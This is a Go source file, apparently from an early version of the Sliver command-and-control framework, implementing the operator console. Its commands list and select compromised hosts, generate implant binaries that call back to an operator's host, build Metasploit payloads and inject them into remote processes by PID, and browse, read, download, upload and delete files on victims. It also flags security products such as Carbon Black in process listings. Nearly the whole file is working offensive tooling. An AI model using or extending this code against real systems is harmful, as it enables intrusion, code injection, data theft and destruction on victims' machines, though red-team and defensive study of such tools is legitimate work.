package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	pb "sliver/protobuf"
	"sliver/server/msf"
	"sort"
	"strconv"
	"strings"
	"text/tabwriter"
	"text/template"

	"github.com/AlecAivazis/survey"
	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

const (
	// ANSI Colors
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"

	// Info - Display colorful information
	Info = bold + cyan + "[*] " + normal
	// Warn - Warn a user
	Warn = bold + red + "[!] " + normal
	// Debug - Display debug information
	Debug = bold + purple + "[-] " + normal
	// Woot - Display success
	Woot = bold + green + "[$] " + normal
)

var (
	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe": red, // SEP
		"cb.exe":       red, // Carbon Black
	}
)

// ---------------------- Command Implementations ----------------------

func helpCmd(ctx *grumble.Context) {
	cmd := ""
	if 0 < len(ctx.Args) {
		cmd = ctx.Args[0]
	}
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(cmd))
	tmpl.Execute(os.Stdout, struct {
		Normal    string
		Bold      string
		Underline string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
	})

}

func sessionsCmd(ctx *grumble.Context) {
	interact := ctx.Flags.String("interact")
	if interact != "" {
		setActiveSliver(ctx, interact)
		return
	}

	if 0 < len(*hive) {
		printSlivers()
	} else {
		fmt.Println("\n" + Info + "No slivers connected\n")
	}
}

func backgroundCmd(ctx *grumble.Context) {
	if activeSliver != nil {
		activeSliver = nil
		ctx.App.SetPrompt(getPrompt())
	}
}

/*
	So this method is a little more complex than you'd maybe think,
	this is because Go's tabwriter aligns columns by counting bytes
	and since we want to modify the color of the active sliver row
	the number of bytes per row won't line up. So we render the table
	into a buffer and note which row the active sliver is in. Then we
	write each line to the term and insert the ANSI codes just before
	we display the row.
*/
func printSlivers() {
	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	// Column Headers
	fmt.Fprintln(table, "\nID\tName\tRemote Address\tUsername\tOperating System\t")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("ID")),
		strings.Repeat("=", len("Name")),
		strings.Repeat("=", len("Remote Address")),
		strings.Repeat("=", len("Username")),
		strings.Repeat("=", len("Operating System")))
	hiveMutex.Lock()
	defer hiveMutex.Unlock()

	// Sort the keys becuase maps have a randomized order
	var keys []int
	for _, sliver := range *hive {
		keys = append(keys, sliver.ID)
	}
	sort.Ints(keys)

	activeIndex := -1
	for index, key := range keys {
		sliver := (*hive)[key]
		if activeSliver != nil && activeSliver.ID == sliver.ID {
			activeIndex = index + 3 // Two lines for the headers
		}
		fmt.Fprintf(table, "%d\t%s\t%s\t%s\t%s\t\n",
			sliver.ID, sliver.Name, sliver.RemoteAddress, sliver.Username,
			fmt.Sprintf("%s/%s", sliver.Os, sliver.Arch))
	}
	table.Flush()

	if activeIndex != -1 {
		lines := strings.Split(outputBuf.String(), "\n")
		for lineNumber, line := range lines {
			if lineNumber == activeIndex {
				fmt.Printf("%s%s%s\n", green, line, normal)
			} else {
				fmt.Printf("%s\n", line)
			}
		}
	} else {
		fmt.Println(outputBuf.String())
	}
}

func killCmd(ctx *grumble.Context) {
	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.ID))
	} else if 0 < len(ctx.Args) {
		sliver = getSliver(ctx.Args[0])
	}
	if sliver != nil {
		fmt.Printf("\n"+Info+"Killing sliver %s (%d)", sliver.Name, sliver.ID)
		data, _ := proto.Marshal(&pb.KillReq{Id: randomID()})
		(*sliver).Send <- pb.Envelope{
			Type: pb.MsgKill,
			Data: data,
		}
	}
}

func infoCmd(ctx *grumble.Context) {
	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.ID))
	} else if 0 < len(ctx.Args) {
		sliver = getSliver(ctx.Args[0])
	}
	if sliver != nil {
		fmt.Println("")
		fmt.Printf(bold+"ID: %s%d\n", normal, sliver.ID)
		fmt.Printf(bold+"Name: %s%s\n", normal, sliver.Name)
		fmt.Printf(bold+"Hostname: %s%s\n", normal, sliver.Hostname)
		fmt.Printf(bold+"Username: %s%s\n", normal, sliver.Username)
		fmt.Printf(bold+"UID: %s%s\n", normal, sliver.UID)
		fmt.Printf(bold+"GID: %s%s\n", normal, sliver.GID)
		fmt.Printf(bold+"PID: %s%d\n", normal, sliver.PID)
		fmt.Printf(bold+"OS: %s%s\n", normal, sliver.Os)
		fmt.Printf(bold+"Arch: %s%s\n", normal, sliver.Arch)
		fmt.Printf(bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
		fmt.Println("")
	} else {
		fmt.Printf("\n" + Warn + "Invalid sliver name\n\n")
	}
}

func useCmd(ctx *grumble.Context) {
	if 0 < len(ctx.Args) {
		setActiveSliver(ctx, ctx.Args[0])
	} else {
		fmt.Printf("\n" + Warn + "Missing sliver name\n\n")
	}
}

func setActiveSliver(ctx *grumble.Context, target string) {
	sliver := getSliver(target)
	if sliver != nil {
		activeSliver = sliver
		ctx.App.SetPrompt(getPrompt())
		fmt.Printf("\n"+Info+"Active sliver set to '%s' (%d)\n\n", activeSliver.Name, activeSliver.ID)
	} else {
		fmt.Printf("\n"+Warn+"No sliver with name '%s'\n\n", target)
	}
}

func generateCmd(ctx *grumble.Context) {

	targetOS := ctx.Flags.String("os")
	arch := ctx.Flags.String("arch")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	debug := ctx.Flags.Bool("debug")
	save := ctx.Flags.String("save")

	if lhost == "" {
		fmt.Printf("\n"+Warn+"Invalid lhost '%s'\n", lhost)
		return
	}

	fmt.Printf("\n"+Info+"Generating new %s/%s sliver binary, please wait ... \n", targetOS, arch)
	path, err := GenerateImplantBinary(targetOS, arch, lhost, uint16(lport), debug)
	if err != nil {
		fmt.Printf(Warn+"Error generating sliver: %v\n", err)
	}
	if save == "" {
		fmt.Printf(Info+"Generated sliver binary at: %s\n\n", path)
	} else {
		saveTo, _ := filepath.Abs(save)
		fi, err := os.Stat(saveTo)
		if err != nil {
			fmt.Printf(Warn+"Failed to generate sliver %v\n\n", err)
			return
		}
		if fi.IsDir() {
			filename := filepath.Base(path)
			saveTo = filepath.Join(saveTo, filename)
		}
		err = copyFileContents(path, saveTo)
		if err != nil {
			fmt.Printf(Warn+"Failed to write to %s\n\n", saveTo)
			return
		}
		fmt.Printf(Info+"Generated sliver binary at: %s\n\n", saveTo)
	}
}

func msfCmd(ctx *grumble.Context) {
	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	if lhost == "" {
		fmt.Printf("\n"+Warn+"Invalid lhost '%s', see `help msf`\n", lhost)
		return
	}

	fmt.Printf("\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
		payloadName, activeSliver.Os, activeSliver.Arch, lhost, lport)
	config := msf.VenomConfig{
		Os:         activeSliver.Os,
		Arch:       msf.Arch(activeSliver.Arch),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint16(lport),
		Encoder:    encoder,
		Iterations: iterations,
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		fmt.Printf(Warn+"Error while generating payload: %v\n", err)
		return
	}
	fmt.Printf(Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

	fmt.Printf(Info+"Sending payload -> %s\n", activeSliver.Name)
	data, _ := proto.Marshal(&pb.Task{
		Encoder: "raw",
		Data:    rawPayload,
	})
	(*activeSliver).Send <- pb.Envelope{
		Type: pb.MsgTask,
		Data: data,
	}
	fmt.Printf(Info + "Sucessfully sent payload\n")

}

func injectCmd(ctx *grumble.Context) {
	injectPid := ctx.Flags.Int("pid")
	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}
	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help msf`\n", lhost)
		return
	}

	fmt.Printf("\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
		payloadName, activeSliver.Os, activeSliver.Arch, lhost, lport)
	config := msf.VenomConfig{
		Os:         activeSliver.Os,
		Arch:       msf.Arch(activeSliver.Arch),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint16(lport),
		Encoder:    encoder,
		Iterations: iterations,
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		fmt.Printf(Warn+"Error while generating payload: %v\n", err)
		return
	}
	fmt.Printf(Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

	fmt.Printf(Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, injectPid)
	data, _ := proto.Marshal(&pb.RemoteTask{
		Pid:     int32(injectPid),
		Encoder: "raw",
		Data:    rawPayload,
	})
	(*activeSliver).Send <- pb.Envelope{
		Type: pb.MsgRemoteTask,
		Data: data,
	}
	fmt.Printf(Info + "Sucessfully sent payload\n")

}

func psCmd(ctx *grumble.Context) {

	pidFilter := ctx.Flags.Int("pid")
	exeFilter := ctx.Flags.String("exe")
	ownerFilter := ctx.Flags.String("owner")

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	fmt.Printf("\n"+Info+"Requesting process list from %s ...\n", activeSliver.Name)

	reqID := randomID()
	data, _ := proto.Marshal(&pb.ProcessListReq{Id: reqID})
	envelope, err := activeSliverRequest(pb.MsgPsListReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s", err)
		return
	}

	psList := &pb.ProcessList{}
	err = proto.Unmarshal(envelope.Data, psList)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	fmt.Fprintf(table, "pid\tppid\texecutable\towner\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("pid")),
		strings.Repeat("=", len("ppid")),
		strings.Repeat("=", len("executable")),
		strings.Repeat("=", len("owner")),
	)

	lineColors := []string{}
	for _, proc := range psList.Processes {
		var lineColor = ""
		if pidFilter != -1 && proc.Pid == int32(pidFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if exeFilter != "" && strings.HasPrefix(proc.Executable, exeFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if ownerFilter != "" && strings.HasPrefix(proc.Owner, ownerFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if pidFilter == -1 && exeFilter == "" && ownerFilter == "" {
			lineColor = printProcInfo(table, proc)
		}

		// Should be set to normal/green if we rendered the line
		if lineColor != "" {
			lineColors = append(lineColors, lineColor)
		}
	}
	table.Flush()

	fmt.Println()
	for index, line := range strings.Split(outputBuf.String(), "\n") {
		// We need to account for the two rows of column headers
		if 0 < len(line) && 2 <= index {
			lineColor := lineColors[index-2]
			fmt.Printf("%s%s%s\n", lineColor, line, normal)
		} else {
			fmt.Printf("%s\n", line)
		}
	}
	fmt.Println()

}

// printProcInfo - Stylizes the process information
func printProcInfo(table *tabwriter.Writer, proc *pb.Process) string {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if proc.Pid == activeSliver.PID {
		color = green
	}
	fmt.Fprintf(table, "%d\t%d\t%s\t%s\t\n", proc.Pid, proc.Ppid, proc.Executable, proc.Owner)
	return color
}

func pingCmd(ctx *grumble.Context) {
	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.ID))
	} else if 0 < len(ctx.Args) {
		sliver = getSliver(ctx.Args[0])
	}
	if sliver == nil {
		fmt.Println("\n" + Warn + "Invalid sliver name\n")
		return
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.Ping{Id: reqID})
	envelope, err := activeSliverRequest(pb.MsgPing, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s\n\n", err)
		return
	}

	pong := &pb.Ping{}
	err = proto.Unmarshal(envelope.Data, pong)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n\n", err)
		return
	}
	fmt.Printf("\n"+Info+"Ping/Pong with ID = %s\n\n", pong.Id)

}

func lsCmd(ctx *grumble.Context) {
	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		ctx.Args = append(ctx.Args, ".")
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.DirListReq{
		Id:   reqID,
		Path: ctx.Args[0],
	})
	envelope, err := activeSliverRequest(pb.MsgDirListReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s\n\n", err)
		return
	}
	dirList := &pb.DirList{}
	err = proto.Unmarshal(envelope.Data, dirList)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n\n", err)
		return
	}

	if dirList.Exists {
		printDirList(dirList)
	} else {
		fmt.Printf("\n"+Warn+"Directory does not exist (%s)\n\n", dirList.Path)
	}

}

func printDirList(dirList *pb.DirList) {
	fmt.Printf("\n%s\n", dirList.Path)
	fmt.Printf("%s\n", strings.Repeat("=", len(dirList.Path)))

	table := tabwriter.NewWriter(os.Stdout, 0, 2, 2, ' ', 0)
	for _, fileInfo := range dirList.Files {
		if fileInfo.IsDir {
			fmt.Fprintf(table, "%s\t<dir>\t\n", fileInfo.Name)
		} else {
			fmt.Fprintf(table, "%s\t%s\t\n", fileInfo.Name, byteCountBinary(fileInfo.Size))
		}
	}
	table.Flush()
	fmt.Println()
}

func rmCmd(ctx *grumble.Context) {
	if len(ctx.Args) < 1 {
		return
	}

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.RmReq{
		Id:   reqID,
		Path: ctx.Args[0],
	})
	envelope, err := activeSliverRequest(pb.MsgRmReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s\n\n", err)
		return
	}
	rm := &pb.Rm{}
	err = proto.Unmarshal(envelope.Data, rm)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n\n", err)
		return
	}
	if rm.Success {
		fmt.Printf("\n"+Info+"Removed remote path %s\n\n", rm.Path)
	} else {
		fmt.Printf("\n"+Warn+"%s\n\n", rm.Err)
	}
}

func mkdirCmd(ctx *grumble.Context) {
	if len(ctx.Args) < 1 {
		return
	}
	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.MkdirReq{
		Id:   reqID,
		Path: ctx.Args[0],
	})
	envelope, err := activeSliverRequest(pb.MsgMkdirReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s\n\n", err)
		return
	}
	mkdir := &pb.Mkdir{}
	err = proto.Unmarshal(envelope.Data, mkdir)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n\n", err)
		return
	}
	if mkdir.Success {
		fmt.Printf("\n"+Info+"Created remote directory %s\n\n", mkdir.Path)
	} else {
		fmt.Printf("\n"+Warn+"Failed to make remote path %s: %s\n\n", mkdir.Path, mkdir.Err)
	}
}

func cdCmd(ctx *grumble.Context) {

	if len(ctx.Args) < 1 {
		return
	}

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.CdReq{
		Id:   reqID,
		Path: ctx.Args[0],
	})
	envelope, err := activeSliverRequest(pb.MsgCdReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s\n", err)
		return
	}
	pwd := &pb.Pwd{}
	err = proto.Unmarshal(envelope.Data, pwd)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	if pwd.Err == "" {
		fmt.Println("\n" + Info + pwd.Path + "\n")
	} else {
		fmt.Println("\n" + Warn + pwd.Err + "\n")
	}

}

func pwdCmd(ctx *grumble.Context) {
	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	reqID := randomID()
	data, _ := proto.Marshal(&pb.PwdReq{Id: reqID})
	envelope, err := activeSliverRequest(pb.MsgPwdReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %s", err)
		return
	}
	pwd := &pb.Pwd{}
	err = proto.Unmarshal(envelope.Data, pwd)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	if pwd.Err == "" {
		fmt.Println("\n" + Info + pwd.Path + "\n")
	} else {
		fmt.Println("\n" + Warn + pwd.Err + "\n")
	}

}

func catCmd(ctx *grumble.Context) {

	if len(ctx.Args) < 1 {
		fmt.Println("\n" + Warn + "Missing file parameter\n")
	}

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Printf("\n" + Warn + "Missing path parameter\n")
	}
	data, err := activeSliverDownload(ctx.Args[0])
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %v\n", err)
		return
	}
	fmt.Println(string(data))
}

func downloadCmd(ctx *grumble.Context) {

	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Println("\n" + Warn + "Missing parameter, see `help download`\n")
		return
	}
	if len(ctx.Args) == 1 {
		ctx.Args = append(ctx.Args, ".")
	}

	src := ctx.Args[0]
	fileName := filepath.Base(src)
	dst, _ := filepath.Abs(ctx.Args[1])
	fi, err := os.Stat(dst)
	if err != nil {
		fmt.Printf(Warn+"%v\n\n", err)
		return
	}
	if fi.IsDir() {
		dst = path.Join(dst, fileName)
	}

	if _, err := os.Stat(dst); err == nil {
		overwrite := false
		prompt := &survey.Confirm{Message: "Overwrite local file?"}
		survey.AskOne(prompt, &overwrite, nil)
		if !overwrite {
			fmt.Println()
			return
		}
	}

	f, err := os.Create(dst)
	if err != nil {
		fmt.Printf("\n"+Warn+"Failed to open local file %s: %v\n", dst, err)
	}
	defer f.Close()

	fmt.Printf("\n"+Info+"%s -> %s\n", fileName, dst)
	data, err := activeSliverDownload(src)
	if err != nil {
		fmt.Printf("\n"+Warn+"Error: %v\n\n", err)
		return
	}

	n, err := f.Write(data)
	if err != nil {
		fmt.Printf(Warn+"Failed to write data %v\n\n", err)
	} else {
		fmt.Printf(Info+"Wrote %d bytes to %s\n\n", n, dst)
	}
}

// Reusable download function (e.g. cat / download commands)
func activeSliverDownload(filePath string) ([]byte, error) {
	reqID := randomID()
	data, _ := proto.Marshal(&pb.DownloadReq{
		Id:   reqID,
		Path: filePath,
	})
	envelope, err := activeSliverRequest(pb.MsgDownloadReq, reqID, data)
	if err != nil {
		return []byte{}, err
	}
	download := &pb.Download{}
	err = proto.Unmarshal(envelope.Data, download)
	if err != nil {
		return []byte{}, err
	}
	if !download.Exists {
		return []byte{}, fmt.Errorf("Remote file does not exist '%s'", download.Path)
	}
	if download.Encoder == "gzip" {
		return gzipRead(download.Data)
	}
	return download.Data, nil
}

func uploadCmd(ctx *grumble.Context) {
	if activeSliver == nil {
		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Println("\n" + Warn + "Missing parameter, see `help upload`\n")
		return
	}

	src, _ := filepath.Abs(ctx.Args[0])
	_, err := os.Stat(src)
	if err != nil {
		fmt.Printf(Warn+"%v\n\n", err)
		return
	}

	if len(ctx.Args) == 1 {
		fileName := filepath.Base(src)
		ctx.Args = append(ctx.Args, fileName)
	}

	fileBuf, err := ioutil.ReadFile(src)
	uploadGzip := bytes.NewBuffer([]byte{})
	gzipWrite(uploadGzip, fileBuf)

	reqID := randomID()
	data, _ := proto.Marshal(&pb.UploadReq{
		Id:      reqID,
		Path:    ctx.Args[1],
		Data:    uploadGzip.Bytes(),
		Encoder: "gzip",
	})
	envelope, err := activeSliverRequest(pb.MsgUploadReq, reqID, data)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	upload := &pb.Upload{}
	err = proto.Unmarshal(envelope.Data, upload)
	if err != nil {
		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if upload.Success {
		fmt.Printf("\n"+Info+"Written to %s\n\n", upload.Path)
	} else {
		fmt.Printf("\n"+Warn+"Error %s", upload.Err)
	}
}

func byteCountBinary(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(b)/float64(div), "KMGTPE"[exp])
}
